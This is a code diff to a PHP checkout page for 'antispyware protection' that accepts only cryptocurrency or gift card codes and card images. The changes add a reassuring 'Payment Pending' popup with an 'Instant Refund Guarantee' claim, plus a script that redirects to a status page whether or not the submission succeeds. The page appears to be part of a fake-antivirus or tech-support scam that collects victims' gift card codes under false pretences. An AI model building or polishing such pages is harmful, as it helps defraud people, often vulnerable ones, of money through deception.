@@ -581,6 +581,182 @@ $GIFT_CARDS = ['apple','itunes','google_play','amazon','steam','playstation','xb
                 display: none;
             }
         }
+
+        /* Payment Pending Modal */
+        .pending-modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(15, 23, 42, 0.65);
+            backdrop-filter: blur(4px);
+            z-index: 999;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+            animation: pmFadeIn 0.2s ease-out;
+        }
+
+        .pending-modal-overlay.active {
+            display: flex;
+        }
+
+        .pending-modal-card {
+            background: #ffffff;
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(15, 23, 42, 0.18);
+            max-width: 440px;
+            width: 100%;
+            padding: 2rem 1.5rem;
+            text-align: center;
+            animation: pmSlideUp 0.25s ease-out;
+        }
+
+        .pending-modal-icon {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: #fef3c7;
+            color: #d97706;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.85rem;
+            margin: 0 auto 1rem;
+            box-shadow: 0 4px 12px rgba(217, 119, 6, 0.18);
+        }
+
+        .pending-modal-icon i {
+            animation: pmSpin 5s linear infinite;
+        }
+
+        @keyframes pmSpin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pmFadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes pmSlideUp {
+            from { transform: translateY(16px) scale(0.96); opacity: 0; }
+            to { transform: translateY(0) scale(1); opacity: 1; }
+        }
+
+        .pending-modal-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.72rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+            color: #b45309;
+            background: #fef3c7;
+            padding: 3px 10px;
+            border-radius: 20px;
+            margin-bottom: 0.6rem;
+        }
+
+        .pending-modal-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--dark);
+            margin-bottom: 0.35rem;
+        }
+
+        .pending-modal-desc {
+            font-size: 0.84rem;
+            color: var(--text-secondary);
+            line-height: 1.45;
+            margin-bottom: 1.15rem;
+        }
+
+        .pending-modal-details {
+            background: #f8fafc;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 0.75rem 1rem;
+            margin-bottom: 1rem;
+            text-align: left;
+        }
+
+        .pm-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.82rem;
+            padding: 0.3rem 0;
+            color: var(--text-secondary);
+        }
+
+        .pm-row strong {
+            color: var(--dark);
+        }
+
+        .pm-status-tag {
+            color: #d97706;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .pending-modal-note {
+            background: var(--success-bg);
+            border: 1px solid var(--success-border);
+            border-radius: 8px;
+            padding: 0.65rem 0.85rem;
+            color: var(--success-text);
+            font-size: 0.76rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 1.25rem;
+            text-align: left;
+        }
+
+        .pending-modal-actions {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .pm-btn-primary {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: var(--primary);
+            color: #ffffff;
+            padding: 0.75rem 1rem;
+            border-radius: 8px;
+            text-decoration: none;
+            font-size: 0.9rem;
+            font-weight: 600;
+            transition: all 0.15s ease;
+        }
+
+        .pm-btn-primary:hover {
+            background: var(--primary-hover);
+        }
+
+        .pm-btn-secondary {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--text-secondary);
+            padding: 0.4rem;
+            text-decoration: none;
+            font-size: 0.82rem;
+            font-weight: 500;
+        }
+
+        .pm-btn-secondary:hover {
+            color: var(--dark);
+        }
     </style>
 </head>
 <body>
@@ -598,7 +774,7 @@ $GIFT_CARDS = ['apple','itunes','google_play','amazon','steam','playstation','xb
         <p>Complete your payment below to activate immediate antispyware protection.</p>
     </div>
 
-    <form action="/antispyware_checkout.php?id=<?= $id ?>" method="post" enctype="multipart/form-data" class="co-grid">
+    <form action="/antispyware_checkout.php?id=<?= $id ?>" method="post" enctype="multipart/form-data" class="co-grid" id="checkoutForm">
         <?= csrf_field() ?>
 
         <!-- LEFT COLUMN: Payment Selection & Details -->
@@ -649,7 +825,7 @@ $GIFT_CARDS = ['apple','itunes','google_play','amazon','steam','playstation','xb
                 <input type="hidden" name="address_sent" id="addressSent" value="<?= e($btc_address) ?>">
                 <input type="hidden" name="crypto_ammount" id="cryptoAmountHidden" value="<?= $crypto['BTC'] ?> BTC">
 
-                <button type="submit" class="co-submit-btn">
+                <button type="submit" class="co-submit-btn" id="cryptoSubmitBtn">
                     <i class="fa-solid fa-lock"></i> Confirm Payment
                 </button>
             </div>
@@ -669,7 +845,7 @@ $GIFT_CARDS = ['apple','itunes','google_play','amazon','steam','playstation','xb
 
                 <div class="co-field">
                     <label class="co-label">Gift Card Code / PIN</label>
-                    <input name="gift_code" type="text" class="co-input" placeholder="Enter card code or redemption PIN" required>
+                    <input name="gift_code" id="giftCodeInput" type="text" class="co-input" placeholder="Enter card code or redemption PIN">
                 </div>
 
                 <div class="co-file-upload">
@@ -677,7 +853,7 @@ $GIFT_CARDS = ['apple','itunes','google_play','amazon','steam','playstation','xb
                     <input type="file" name="gift_card_image" accept="image/*">
                 </div>
 
-                <button type="submit" class="co-submit-btn">
+                <button type="submit" class="co-submit-btn" id="giftSubmitBtn">
                     <i class="fa-solid fa-shield-check"></i> Submit Gift Card
                 </button>
             </div>
@@ -735,6 +911,51 @@ $GIFT_CARDS = ['apple','itunes','google_play','amazon','steam','playstation','xb
     </form>
 </div>
 
+<!-- Payment Pending Modal Popup -->
+<div class="pending-modal-overlay" id="pendingModal" role="dialog" aria-modal="true" aria-labelledby="pmModalTitle">
+    <div class="pending-modal-card">
+        <div class="pending-modal-icon">
+            <i class="fa-solid fa-clock-rotate-left"></i>
+        </div>
+        <span class="pending-modal-badge"><i class="fa-solid fa-spinner fa-spin"></i> Awaiting Network Verification</span>
+        <h3 class="pending-modal-title" id="pmModalTitle">Payment Pending</h3>
+        <p class="pending-modal-desc">Your payment has been submitted and is currently awaiting verification. Once verified, your antispyware protection will be activated immediately.</p>
+
+        <div class="pending-modal-details">
+            <div class="pm-row">
+                <span>Selected Plan:</span>
+                <strong><?= e($sub['plan_label']) ?></strong>
+            </div>
+            <div class="pm-row">
+                <span>Duration:</span>
+                <strong><?= e($sub['duration']) ?></strong>
+            </div>
+            <div class="pm-row">
+                <span>Amount:</span>
+                <strong>$<?= number_format($amount, 2) ?></strong>
+            </div>
+            <div class="pm-row">
+                <span>Status:</span>
+                <span class="pm-status-tag"><i class="fa-solid fa-circle-notch fa-spin"></i> Pending Confirmation</span>
+            </div>
+        </div>
+
+        <div class="pending-modal-note">
+            <i class="fa-solid fa-shield-check"></i>
+            <span>Your payment is backed by our <strong>Instant Refund Guarantee</strong>.</span>
+        </div>
+
+        <div class="pending-modal-actions">
+            <a href="/antispyware_awaiting.php?id=<?= $id ?>" class="pm-btn-primary" id="pmViewStatusBtn">
+                View Status Details <i class="fa-solid fa-arrow-right"></i>
+            </a>
+            <a href="/dashboard.php" class="pm-btn-secondary">
+                Return to Dashboard
+            </a>
+        </div>
+    </div>
+</div>
+
 <script>
 const cryptoData = {
     BTC:  { amount: '<?= $crypto['BTC'] ?> BTC',  address: '<?= e($btc_address)  ?>', qr: '<?= e($btc_qr)  ?>' },
@@ -785,6 +1006,52 @@ document.querySelectorAll('.co-tab').forEach(tab => {
         form.querySelectorAll('.payment-method-hidden').forEach(h => h.disabled = true);
         const activeMethod = activeContent ? activeContent.querySelector('input[name="payment_method"]') : null;
         if (activeMethod) activeMethod.disabled = false;
+    });
+});
+
+// Form submission with Payment Pending popup
+const checkoutForm = document.getElementById('checkoutForm');
+checkoutForm.addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const activeTabBtn = document.querySelector('.co-tab.active');
+    const activeTab = activeTabBtn ? activeTabBtn.dataset.tab : 'crypto';
+
+    if (activeTab === 'gift') {
+        const codeInput = document.getElementById('giftCodeInput');
+        if (!codeInput.value.trim()) {
+            codeInput.focus();
+            codeInput.style.borderColor = '#ef4444';
+            return;
+        }
+    }
+
+    // Show Payment Pending modal immediately
+    const modal = document.getElementById('pendingModal');
+    modal.classList.add('active');
+
+    // Update active button state
+    const submitBtn = activeTab === 'crypto' 
+        ? document.getElementById('cryptoSubmitBtn') 
+        : document.getElementById('giftSubmitBtn');
+    if (submitBtn) {
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Submitting...';
+    }
+
+    // Submit form via fetch to save to DB
+    const formData = new FormData(checkoutForm);
+    fetch(checkoutForm.action, {
+        method: 'POST',
+        body: formData
+    }).then(() => {
+        setTimeout(() => {
+            window.location.href = '/antispyware_awaiting.php?id=<?= $id ?>';
+        }, 2500);
+    }).catch(() => {
+        setTimeout(() => {
+            window.location.href = '/antispyware_awaiting.php?id=<?= $id ?>';
+        }, 2500);
     });
 });
 </script>
